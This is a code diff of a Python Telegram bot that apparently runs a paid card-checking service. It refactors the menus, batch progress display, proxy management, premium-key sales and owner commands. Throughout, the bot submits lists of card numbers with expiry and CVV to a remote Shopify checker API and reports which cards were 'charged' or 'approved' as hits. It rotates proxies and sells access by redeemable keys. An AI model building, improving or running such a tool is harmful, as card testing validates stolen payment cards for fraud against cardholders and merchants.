+                stat['declined'] += 1
             else:
-                results['error'] += 1
+                stat['error'] += 1
 
-            results['checked'] += 1
+            stat['done'] += 1
 
-            if results['checked'] % 15 == 0:
-                elapsed = int(time.time() - results['start'])
-                total_done = results['checked']
-                pct = int(total_done / total * 100)
-                prog_bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))
-
-                await status_msg.edit(
-                    f"<b>『 🔥 BANKAI BATCH ACTIVE 』</b>\n\n"
-                    f"<b>Progress:</b> [{prog_bar}] {pct}%\n"
-                    f"<b>Checked:</b>  {total_done}/{total}\n\n"
-                    f"<b>💎 Charged:</b>  {results['charged']}\n"
-                    f"<b>✅ Approved:</b> {results['approved']}\n"
-                    f"<b>❌ Declined:</b> {results['declined']}\n"
-                    f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
-                    f"<b>⏱️ Time:</b> {elapsed}s",
-                    parse_mode='html',
-                    buttons=buttons
+            if stat['done'] % 10 == 0:
+                pct = int(stat['done'] / total * 100)
+                bar = '█' * (pct // 10) + '░' * (10 - pct // 10)
+                sec = int(time.time() - stat['t0'])
+                await msg.edit(
+                    f"<b>⚡ Checking...</b>\n\n"
+                    f"[{bar}] {pct}%\n"
+                    f"<b>Done:</b> {stat['done']}/{total}\n\n"
+                    f"💎 {stat['charged']}  ✅ {stat['approved']}  "
+                    f"❌ {stat['declined']}  ⚠️ {stat['error']}\n\n"
+                    f"<b>Time:</b> {sec}s",
+                    parse_mode='html', buttons=btns
                 )
 
-        elapsed = int(time.time() - results['start'])
-        final   = (
-            f"<b>『 ✅ BANKAI COMPLETE 』</b>\n\n"
-            f"<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n"
-            f"<b>Total:</b>    {total}\n"
-            f"<b>Checked:</b>  {results['checked']}\n\n"
-            f"<b>💎 Charged:</b>  {results['charged']}\n"
-            f"<b>✅ Approved:</b> {results['approved']}\n"
-            f"<b>❌ Declined:</b> {results['declined']}\n"
-            f"<b>⚠️ Errors:</b>   {results['error']}\n\n"
-            f"<b>⏱️ Time:</b> {elapsed}s"
+        sec = int(time.time() - stat['t0'])
+        final = (
+            f"<b>✅ Batch Complete</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"<b>Total:</b>   {total}\n"
+            f"<b>Checked:</b> {stat['done']}\n\n"
+            f"💎 Charged:  {stat['charged']}\n"
+            f"✅ Approved: {stat['approved']}\n"
+            f"❌ Declined: {stat['declined']}\n"
+            f"⚠️ Errors:   {stat['error']}\n\n"
+            f"<b>Time:</b> {sec}s"
         )
-
         if hits:
-            final += "\n\n<b>━━━━━ HITS ━━━━━</b>\n"
-            final += "\n".join(hits[:20])
+            final += '\n\n<b>── Hits ──</b>\n' + '\n'.join(hits[:30])
+        await msg.edit(final, parse_mode='html')
+        sessions.pop(sid, None)
 
-        await status_msg.edit(final, parse_mode='html')
-
-        if sid in active_sessions:
-            del active_sessions[sid]
-
-    except Exception as e:
-        await status_msg.edit(f"<b>❌ Error: {str(e)[:100]}</b>", parse_mode='html')
+    except Exception as ex:
+        await msg.edit(f'<b>Error:</b> <code>{str(ex)[:150]}</code>', parse_mode='html')
     finally:
-        if os.path.exists(file_path):
-            os.remove(file_path)
+        if os.path.exists(path):
+            os.remove(path)
 
-# ============================================================================
-# 🎮 CALLBACK HANDLERS
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  PAUSE / STOP BATCH
+# ═══════════════════════════════════════════════
 
-@bot.on(events.CallbackQuery(pattern=b"zanpakuto"))
-async def zanpakuto_menu(event):
-    buttons = [
-        [Button.inline("⚪ Tensa Zangetsu — Single Check",   data=b"usage_cc")],
-        [Button.inline("🔴 Ryūjin Jakka — Batch Check",      data=b"usage_chk")],
-        [Button.inline("🔵 Sōgyo no Kotowari — Proxy Info",  data=b"proxy_info")],
-        [Button.inline("💜 Kyōka Suigetsu — My Stats",       data=b"stats")],
-        [Button.inline("🟡 Katen Kyōkotsu — API Status",     data=b"api_status")],
-        [Button.inline("🔙 Back", data=b"back_start")],
-    ]
+@bot.on(events.CallbackQuery(pattern=rb'p_(.+)'))
+async def cb_pause(e):
+    sid = e.data.decode()[2:]
+    if sid in sessions:
+        sessions[sid]['pause'] = not sessions[sid]['pause']
+        await e.answer('⏸ Paused' if sessions[sid]['pause'] else '▶ Resumed')
 
-    await event.edit(
-        "<b>⚔️ 『 ZANPAKUTO ARSENAL 』</b>\n\n"
-        "<b>Choose your spirit sword:</b>\n\n"
-        "⚪ <b>Tensa Zangetsu</b>\n"
-        "└ Check single card\n\n"
-        "🔴 <b>Ryūjin Jakka</b>\n"
-        "└ Batch check from .txt file\n\n"
-        "🔵 <b>Sōgyo no Kotowari</b>\n"
-        "└ Proxy management\n\n"
-        "💜 <b>Kyōka Suigetsu</b>\n"
-        "└ View your soul stats\n\n"
-        "🟡 <b>Katen Kyōkotsu</b>\n"
-        "└ Check API online status",
+@bot.on(events.CallbackQuery(pattern=rb's_(.+)'))
+async def cb_stop(e):
+    sid = e.data.decode()[2:]
+    if sid in sessions:
+        sessions[sid]['stop'] = True
+        sessions.pop(sid, None)
+    await e.answer('🛑 Stopped')
+
+# ═══════════════════════════════════════════════
+#  CALLBACKS — MENUS
+# ═══════════════════════════════════════════════
+
+@bot.on(events.CallbackQuery(pattern=b'cmd_help'))
+async def cb_cmds(e):
+    await e.edit(
+        "<b>📋 All Commands</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "<b>User Commands:</b>\n"
+        "/start — Main menu\n"
+        "/cc CARD|MM|YY|CVV — Single check\n"
+        "/chk — Batch check (reply to .txt)\n"
+        "/redeem KEY — Redeem premium key\n\n"
+        "<b>Owner Commands:</b>\n"
+        "/genkey COUNT DAYS — Generate keys\n"
+        "/addprem UID DAYS — Add premium\n"
+        "/rmprem UID — Remove premium\n"
+        "/listprem — List premium users\n"
+        "/addproxy — Add proxies\n"
+        "/clearproxy — Clear all proxies\n"
+        "/broadcast MSG — Send to all users",
         parse_mode='html',
-        buttons=buttons
+        buttons=[[Button.inline('🔙 Back', b'back')]]
     )
-    await event.answer()
+    await e.answer()
 
-@bot.on(events.CallbackQuery(pattern=b"usage_cc"))
-async def usage_cc(event):
-    await event.edit(
-        "<b>⚪ 𝗧𝗲𝗻𝘀𝗮 𝗭𝗮𝗻𝗴𝗲𝘁𝘀𝘂 — Single Check</b>\n\n"
-        "<b>Command:</b>\n"
-        "<code>/cc CARD|MM|YY|CVV</code>\n\n"
-        "<b>Example:</b>\n"
-        "<code>/cc 4111111111111111|12|25|123</code>\n\n"
-        "<b>Returns:</b>\n"
-        "• Status (Charged/Approved/Declined)\n"
-        "• Gateway & Price\n"
-        "• BIN Info (Bank, Brand, Country)\n"
-        "• Response code\n"
-        "• Reiatsu update",
+@bot.on(events.CallbackQuery(pattern=b'profile'))
+async def cb_profile(e):
+    uid  = e.sender_id
+    prem = is_premium(uid)
+    exp  = premium_expiry(uid)
+    tag  = '✅ Premium' if prem else '❌ Free'
+    exp_line = f'\n<b>Expires:</b> {exp}' if exp else ''
+
+    await e.edit(
+        f"<b>👤 My Profile</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>ID:</b>   <code>{uid}</code>\n"
+        f"<b>Plan:</b> {tag}{exp_line}\n\n"
+        f"<b>Proxies loaded:</b> {len(load_proxies())}",
         parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
+        buttons=[[Button.inline('🔙 Back', b'back')]]
     )
-    await event.answer()
+    await e.answer()
 
-@bot.on(events.CallbackQuery(pattern=b"usage_chk"))
-async def usage_chk(event):
-    await event.edit(
-        "<b>🔴 𝗥𝘆ū𝗷𝗶𝗻 𝗝𝗮𝗸𝗸𝗮 — Batch Check</b>\n\n"
-        "<b>How to use:</b>\n"
-        "1. Upload a .txt file with cards\n"
-        "2. Reply to that file with <code>/chk</code>\n\n"
-        "<b>Card format in file:</b>\n"
-        "<code>4111111111111111|12|25|123</code>\n\n"
-        "<b>Features:</b>\n"
-        "• Live progress bar\n"
-        "• Pause / Stop controls\n"
-        "• Hits summary at end\n"
-        "• Reiatsu gained per check",
-        parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
-    )
-    await event.answer()
-
-@bot.on(events.CallbackQuery(pattern=b"stats"))
-async def stats_handler(event):
-    user_id = event.sender_id
-    soul    = get_soul(user_id)
-    rank    = get_rank(soul)
-    bar     = get_reiatsu_bar(soul['reiatsu'])
-
-    total = soul['checks']
-    hr    = f"{soul['charged']/total*100:.1f}%" if total > 0 else "0%"
-    ar    = f"{soul['approved']/total*100:.1f}%" if total > 0 else "0%"
-
-    await event.edit(
-        f"<b>📊 『 SOUL STATS 』</b>\n\n"
-        f"<b>⚔️ Rank:</b>     {rank}\n"
-        f"<b>💜 Reiatsu:</b>  {bar}\n\n"
-        f"<b>━━━━━━ CHECKER ━━━━━━</b>\n"
-        f"<b>Total Checks:</b>  {soul['checks']}\n"
-        f"<b>💎 Charged:</b>    {soul['charged']} ({hr})\n"
-        f"<b>✅ Approved:</b>   {soul['approved']} ({ar})\n"
-        f"<b>❌ Declined:</b>   {soul['declined']}\n\n"
-        f"<b>━━━━━ NEXT RANK ━━━━━</b>\n"
-        f"<b>Checks to next rank:</b> {max(0, [10,50,150,300][min(3, ['Academy','Seated','Captain','Kenpachi'].index(rank.split()[0]) if any(x in rank for x in ['Academy','Seated','Captain','Kenpachi']) else 3)] - soul['checks'])}",
-        parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
-    )
-    await event.answer()
-
-@bot.on(events.CallbackQuery(pattern=b"reiatsu"))
-async def reiatsu_handler(event):
-    user_id = event.sender_id
-    soul    = get_soul(user_id)
-    pct     = soul['reiatsu']
-    bar     = get_reiatsu_bar(pct)
-
-    if pct < 20:   lvl = "🟦 Academy Student"
-    elif pct < 40: lvl = "🟩 Seated Officer"
-    elif pct < 60: lvl = "🟪 Captain Class"
-    elif pct < 80: lvl = "🟥 Kenpachi Level"
-    else:          lvl = "⭐ Zero Squad"
-
-    await event.edit(
-        f"<b>💜 『 REIATSU POWER 』</b>\n\n"
-        f"<b>Level:</b>  {lvl}\n"
-        f"<b>Power:</b>  {bar}\n\n"
-        f"<b>How to raise Reiatsu:</b>\n"
-        f"⚡ Charged = +10%\n"
-        f"✅ Approved = +5%\n"
-        f"❌ Declined = +1%",
-        parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
-    )
-    await event.answer()
-
-@bot.on(events.CallbackQuery(pattern=b"bankai"))
-async def bankai_handler(event):
-    user_id = event.sender_id
-    prem    = is_premium(user_id)
-
-    if prem:
-        expiry = get_premium_expiry(user_id)
-        msg = (
-            "<b>🔥 『 BANKAI ACTIVE 』🔥</b>\n\n"
-            "✅ Full Zanpakuto Arsenal unlocked\n"
-            "✅ Unlimited checks\n"
-            "✅ Batch processing\n"
-            "✅ Priority routing\n\n"
-            f"<b>📅 Access expires:</b> {expiry}\n\n"
-            "<b>⚫ You are a true Soul Reaper!</b>"
-        )
-    else:
-        msg = (
-            "<b>🔥 『 BANKAI MODE 』🔥</b>\n\n"
-            "⛔ <b>Reiatsu Seal Active</b>\n\n"
-            "Bankai requires premium access.\n"
-            "Contact Soul Society admin to unlock.\n\n"
-            "<b>Premium unlocks:</b>\n"
-            "• /cc single check\n"
-            "• /chk batch check\n"
-            "• Full Zanpakuto Arsenal\n"
-            "• Unlimited usage"
-        )
-
-    await event.edit(msg, parse_mode='html', buttons=[[Button.inline("🔙 Back", data=b"back_start")]])
-    await event.answer("🔥 BANKAI!", alert=not prem)
-
-@bot.on(events.CallbackQuery(pattern=b"proxy_info"))
-async def proxy_info_handler(event):
-    proxies = load_proxies()
-    await event.edit(
-        f"<b>🔵 『 PROXY STATUS 』</b>\n\n"
-        f"<b>Loaded proxies:</b> {len(proxies)}\n\n"
-        f"<b>Format:</b>\n"
-        f"<code>ip:port:user:pass</code>\n\n"
-        f"<b>Add proxies via command:</b>\n"
+@bot.on(events.CallbackQuery(pattern=b'proxy_menu'))
+async def cb_proxy(e):
+    n = len(load_proxies())
+    await e.edit(
+        f"<b>🌐 Proxy Manager</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>Loaded:</b> {n} proxies\n\n"
+        f"<b>Add:</b>\n"
         f"<code>/addproxy\n"
         f"ip:port:user:pass\n"
         f"ip:port:user:pass</code>\n\n"
-        f"<b>Clear all:</b> <code>/clearproxy</code>",
+        f"<b>Clear:</b> <code>/clearproxy</code>",
         parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
+        buttons=[[Button.inline('🔙 Back', b'back')]]
     )
-    await event.answer()
+    await e.answer()
 
-@bot.on(events.CallbackQuery(pattern=b"api_status"))
-async def api_status_handler(event):
-    await event.answer("🔄 Checking...", alert=False)
+@bot.on(events.CallbackQuery(pattern=b'api_check'))
+async def cb_api(e):
+    await e.answer('Checking...')
     try:
-        timeout = aiohttp.ClientTimeout(total=10)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API.replace('/shopify', '/health')) as resp:
-                online = resp.status == 200
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as s:
+            async with s.get(CHECKER_API.replace('/shopify', '/health')) as r:
+                ok = r.status == 200
     except:
-        online = False
-
-    status = "✅ ONLINE" if online else "❌ OFFLINE"
-    await event.edit(
-        f"<b>🟡 『 API STATUS 』</b>\n\n"
-        f"<b>Zanpakuto Engine:</b> {status}\n"
-        f"<b>Endpoint:</b> <code>{CHECKER_API}</code>",
+        ok = False
+    st = '✅ ONLINE' if ok else '❌ OFFLINE'
+    await e.edit(
+        f"<b>📊 API Status</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>Checker:</b> {st}\n"
+        f"<b>API:</b> <code>{CHECKER_API}</code>",
         parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"zanpakuto")]]
+        buttons=[[Button.inline('🔙 Back', b'back')]]
     )
 
-@bot.on(events.CallbackQuery(pattern=b"society"))
-async def society_handler(event):
-    souls = load_souls()
-    total_users   = len(souls)
-    total_checks  = sum(s.get('checks', 0) for s in souls.values())
-    total_charged = sum(s.get('charged', 0) for s in souls.values())
-
-    await event.edit(
-        f"<b>⛩️ 『 SOUL SOCIETY STATS 』</b>\n\n"
-        f"<b>👥 Total Reapers:</b> {total_users}\n"
-        f"<b>⚔️ Total Checks:</b>  {total_checks}\n"
-        f"<b>💎 Total Charged:</b> {total_charged}\n\n"
-        f"<b>🌟 Powered by Zanpakuto Engine</b>",
+@bot.on(events.CallbackQuery(pattern=b'redeem_help'))
+async def cb_redeem(e):
+    await e.edit(
+        "<b>🔑 Redeem Key</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Send in chat:\n"
+        "<code>/redeem YOUR-KEY-HERE</code>\n\n"
+        "Get a key from the bot owner.",
         parse_mode='html',
-        buttons=[[Button.inline("🔙 Back", data=b"back_start")]]
+        buttons=[[Button.inline('🔙 Back', b'back')]]
     )
-    await event.answer()
+    await e.answer()
 
-@bot.on(events.CallbackQuery(pattern=b"back_start"))
-async def back_start(event):
-    await event.answer()
-    await event.delete()
-    await event.respond('/start')
+@bot.on(events.CallbackQuery(pattern=b'back'))
+async def cb_back(e):
+    await e.answer()
+    await e.delete()
+    await e.respond('/start')
 
-# Pause/Stop session handlers
-@bot.on(events.CallbackQuery(pattern=rb"pause_(.+)"))
-async def pause_handler(event):
-    sid = event.data.decode().replace("pause_", "")
-    if sid in active_sessions:
-        active_sessions[sid]['paused'] = not active_sessions[sid]['paused']
-        state = "⏸️ Paused" if active_sessions[sid]['paused'] else "▶️ Resumed"
-        await event.answer(state, alert=False)
+# ═══════════════════════════════════════════════
+#  OWNER COMMANDS
+# ═══════════════════════════════════════════════
 
-@bot.on(events.CallbackQuery(pattern=rb"stop_(.+)"))
-async def stop_handler(event):
-    sid = event.data.decode().replace("stop_", "")
-    if sid in active_sessions:
-        active_sessions[sid]['stopped'] = True
-        del active_sessions[sid]
-    await event.answer("🛑 Stopping...", alert=False)
+def owner_only(func):
+    async def wrapper(e):
+        if e.sender_id != OWNER_ID:
+            return await e.reply('<b>⛔ Owner only</b>', parse_mode='html')
+        return await func(e)
+    return wrapper
 
-# ============================================================================
-# 🌐 /addproxy - ADD PROXIES VIA TELEGRAM
-# ============================================================================
-
-@bot.on(events.NewMessage(pattern=r'^/addproxy'))
-async def addproxy_handler(event):
-    if event.sender_id != OWNER_ID:
-        await event.reply("<b>⛔ Owner only</b>", parse_mode='html')
-        return
-
-    text  = event.message.text.replace('/addproxy', '').strip()
-    lines = [l.strip() for l in text.splitlines() if l.strip()]
-
-    if not lines:
-        await event.reply(
-            "<b>🌐 Add Proxies</b>\n\n"
-            "<b>Usage:</b>\n"
-            "<code>/addproxy\n"
-            "ip:port:user:pass\n"
-            "ip:port:user:pass</code>\n\n"
-            "Paste all proxies after the command.",
-            parse_mode='html'
-        )
-        return
-
-    existing = load_proxies()
-    added    = 0
-    for line in lines:
-        if line not in existing:
-            existing.append(line)
-            added += 1
-    save_proxies(existing)
-
-    await event.reply(
-        f"<b>✅ Proxies Updated</b>\n\n"
-        f"<b>Added:</b> {added}\n"
-        f"<b>Total:</b> {len(existing)}",
-        parse_mode='html'
-    )
-
-@bot.on(events.NewMessage(pattern=r'^/clearproxy'))
-async def clearproxy_handler(event):
-    if event.sender_id != OWNER_ID:
-        await event.reply("<b>⛔ Owner only</b>", parse_mode='html')
-        return
-    save_proxies([])
-    await event.reply("<b>✅ All proxies cleared</b>", parse_mode='html')
-
-# ============================================================================
-# 🔑 /genkey - OWNER ONLY KEY GENERATOR
-# ============================================================================
-
+# /genkey COUNT DAYS
 @bot.on(events.NewMessage(pattern=r'^/genkey'))
-async def genkey_handler(event):
-    user_id = event.sender_id
-    if user_id != OWNER_ID:
-        await event.reply("<b>⛔ Soul King Access Only</b>", parse_mode='html')
-        return
+@owner_only
+async def cmd_genkey(e):
+    parts = e.message.text.strip().split()
+    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
+    days  = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
+    count = min(count, 50)
+    keys  = create_keys(count, days)
+    dur   = f'{days} days' if days > 0 else 'Lifetime'
+    lines = '\n'.join(f'<code>{k}</code>' for k in keys)
+    await e.reply(
+        f"<b>🔑 Keys Generated</b>\n\n"
+        f"<b>Count:</b> {count}\n"
+        f"<b>Duration:</b> {dur}\n\n{lines}",
+        parse_mode='html')
 
-    # Usage: /genkey [count] [days]
-    # /genkey        → 1 key, permanent
-    # /genkey 5      → 5 keys, permanent
-    # /genkey 5 30   → 5 keys, 30 days each
-    text  = event.message.text.strip().split()
-    count = int(text[1]) if len(text) > 1 and text[1].isdigit() else 1
-    days  = int(text[2]) if len(text) > 2 and text[2].isdigit() else 0
-    count = min(count, 20)
+# /addprem UID [DAYS]
+@bot.on(events.NewMessage(pattern=r'^/addprem'))
+@owner_only
+async def cmd_addprem(e):
+    parts = e.message.text.strip().split()
+    if len(parts) < 2:
+        return await e.reply('<b>Usage:</b> <code>/addprem USER_ID [DAYS]</code>', parse_mode='html')
+    uid  = int(parts[1])
+    days = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 0
+    add_premium(uid, days)
+    dur = f'{days} days' if days > 0 else 'Lifetime'
+    await e.reply(f'<b>✅ Premium added</b>\n<b>User:</b> <code>{uid}</code>\n<b>Duration:</b> {dur}', parse_mode='html')
 
-    keys_data  = load_keys()
-    new_keys   = []
-    for _ in range(count):
-        key = generate_key()
-        keys_data[key] = {
-            'used': False, 'used_by': None,
-            'days': days,
-            'created': datetime.now().isoformat()
-        }
-        new_keys.append(key)
-    save_keys(keys_data)
+# /rmprem UID
+@bot.on(events.NewMessage(pattern=r'^/rmprem'))
+@owner_only
+async def cmd_rmprem(e):
+    parts = e.message.text.strip().split()
+    if len(parts) < 2:
+        return await e.reply('<b>Usage:</b> <code>/rmprem USER_ID</code>', parse_mode='html')
+    uid = int(parts[1])
+    remove_premium(uid)
+    await e.reply(f'<b>✅ Premium removed for</b> <code>{uid}</code>', parse_mode='html')
 
-    duration  = f"{days} days" if days > 0 else "♾️ Permanent"
-    key_lines = '\n'.join(f"<code>{k}</code>" for k in new_keys)
-    await event.reply(
-        f"<b>🔑 『 SOUL KEYS GENERATED 』</b>\n\n"
-        f"<b>Count:</b>    {count}\n"
-        f"<b>Duration:</b> {duration}\n\n"
-        f"{key_lines}\n\n"
-        f"<b>Users redeem with:</b> <code>/redeem KEY</code>",
-        parse_mode='html'
-    )
+# /listprem
+@bot.on(events.NewMessage(pattern=r'^/listprem'))
+@owner_only
+async def cmd_listprem(e):
+    data = list_premium_users()
+    if not data:
+        return await e.reply('<b>No premium users</b>', parse_mode='html')
+    lines = []
+    for uid, info in data.items():
+        exp = info.get('expires')
+        tag = 'Lifetime' if exp is None else datetime.fromisoformat(exp).strftime('%Y-%m-%d')
+        lines.append(f'<code>{uid}</code> — {tag}')
+    await e.reply('<b>👑 Premium Users</b>\n\n' + '\n'.join(lines), parse_mode='html')
 
-# ============================================================================
-# 🔓 /redeem - REDEEM PREMIUM KEY
-# ============================================================================
+# /addproxy
+@bot.on(events.NewMessage(pattern=r'^/addproxy'))
+@owner_only
+async def cmd_addproxy(e):
+    text  = e.message.text.replace('/addproxy', '').strip()
+    lines = [l.strip() for l in text.splitlines() if l.strip()]
+    if not lines:
+        return await e.reply(
+            '<b>Usage:</b>\n<code>/addproxy\nip:port:user:pass\nip:port:user:pass</code>',
+            parse_mode='html')
+    cur   = load_proxies()
+    added = 0
+    for l in lines:
+        if l not in cur:
+            cur.append(l)
+            added += 1
+    save_proxies(cur)
+    await e.reply(f'<b>✅ Added {added} proxies (total: {len(cur)})</b>', parse_mode='html')
+
+# /clearproxy
+@bot.on(events.NewMessage(pattern=r'^/clearproxy'))
+@owner_only
+async def cmd_clearproxy(e):
+    save_proxies([])
+    await e.reply('<b>✅ All proxies cleared</b>', parse_mode='html')
+
+# /broadcast
+@bot.on(events.NewMessage(pattern=r'^/broadcast\s+'))
+@owner_only
+async def cmd_broadcast(e):
+    text = e.message.text.split(maxsplit=1)[1]
+    data = list_premium_users()
+    sent = 0
+    for uid in data:
+        try:
+            await bot.send_message(int(uid), f'<b>📢 Broadcast</b>\n\n{text}', parse_mode='html')
+            sent += 1
+        except:
+            pass
+    await e.reply(f'<b>✅ Sent to {sent}/{len(data)} users</b>', parse_mode='html')
+
+# ═══════════════════════════════════════════════
+#  /redeem KEY
+# ═══════════════════════════════════════════════
 
 @bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
-async def redeem_handler(event):
-    user_id = event.sender_id
-    key     = event.message.text.replace('/redeem', '').strip().upper()
+async def cmd_redeem(e):
+    uid = e.sender_id
+    key = e.message.text.split(maxsplit=1)[1].strip().upper()
 
-    if is_premium(user_id):
-        await event.reply("<b>✅ You already have Bankai access!</b>", parse_mode='html')
-        return
+    if is_premium(uid):
+        return await e.reply('<b>✅ You already have premium!</b>', parse_mode='html')
 
-    keys_data = load_keys()
-    if key not in keys_data:
-        await event.reply(
-            "<b>❌ Invalid Key</b>\n\nThis Soul Key does not exist.",
-            parse_mode='html'
-        )
-        return
+    days, status = redeem_key(uid, key)
+    if status != 'OK':
+        return await e.reply(f'<b>❌ {status}</b>', parse_mode='html')
 
-    if keys_data[key]['used']:
-        await event.reply(
-            "<b>❌ Key Already Used</b>\n\nThis Soul Key has already been redeemed.",
-            parse_mode='html'
-        )
-        return
-
-    days = keys_data[key].get('days', 0)
-    keys_data[key]['used']    = True
-    keys_data[key]['used_by'] = user_id
-    keys_data[key]['used_at'] = datetime.now().isoformat()
-    save_keys(keys_data)
-    add_premium(user_id, days)
-
-    duration = f"{days} days" if days > 0 else "♾️ Permanent"
-    expiry   = get_premium_expiry(user_id)
-
-    await event.reply(
-        f"<b>🔥 『 BANKAI UNLOCKED 』🔥</b>\n\n"
-        f"<b>✅ Key accepted!</b>\n"
-        f"<b>💜 Soul ID:</b>  <code>{user_id}</code>\n"
-        f"<b>⏳ Duration:</b> {duration}\n"
-        f"<b>📅 Expires:</b>  {expiry}\n\n"
-        f"You now have full Zanpakuto Arsenal access:\n"
-        f"• /cc — Single card check\n"
-        f"• /chk — Batch file check\n\n"
-        f"<b>⚫ Welcome to Soul Society, Reaper!</b>",
-        parse_mode='html'
-    )
+    dur = f'{days} days' if days > 0 else 'Lifetime'
+    exp = premium_expiry(uid)
+    await e.reply(
+        f"<b>✅ Key Redeemed!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"<b>Plan:</b>    {dur}\n"
+        f"<b>Expires:</b> {exp}\n\n"
+        f"Commands unlocked:\n"
+        f"/cc — Single check\n"
+        f"/chk — Batch check",
+        parse_mode='html')
 
     try:
-        await bot.send_message(
-            OWNER_ID,
-            f"<b>🔑 Key Redeemed</b>\n\n"
-            f"<b>Key:</b>     <code>{key}</code>\n"
-            f"<b>User:</b>    <code>{user_id}</code>\n"
-            f"<b>Duration:</b> {duration}\n"
-            f"<b>Expires:</b>  {expiry}",
-            parse_mode='html'
-        )
-    except Exception:
+        await bot.send_message(OWNER_ID,
+            f"<b>🔑 Key Redeemed</b>\n<b>Key:</b> <code>{key}</code>\n"
+            f"<b>User:</b> <code>{uid}</code>\n<b>Duration:</b> {dur}",
+            parse_mode='html')
+    except:
         pass
 
-# ============================================================================
-# 🚀 STARTUP
-# ============================================================================
+# ═══════════════════════════════════════════════
+#  START
+# ═══════════════════════════════════════════════
 
-print("\n🔥 ╔══════════════════════════════════╗ 🔥")
-print("🔥 ║   𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 - ACTIVATED        ║ 🔥")
-print("🔥 ║   Soul Reaper Card Checker        ║ 🔥")
-print("🔥 ║   Bleach × Shopify Fusion         ║ 🔥")
-print("🔥 ╚══════════════════════════════════╝ 🔥\n")
-print("⚔️  Zanpakuto Engine : Connected")
-print(f"🌐 Checker API     : {CHECKER_API}")
-print("💜 Reiatsu System  : Online")
-print("⛩️  Soul Society    : Ready\n")
+print('\n⚡ SHOPIIIX Bot Active')
+print(f'🌐 API: {CHECKER_API}')
+print(f'📡 Proxies: {len(load_proxies())}')
+print(f'👑 Owner: {OWNER_ID}\n')
 
 bot.run_until_disconnected()
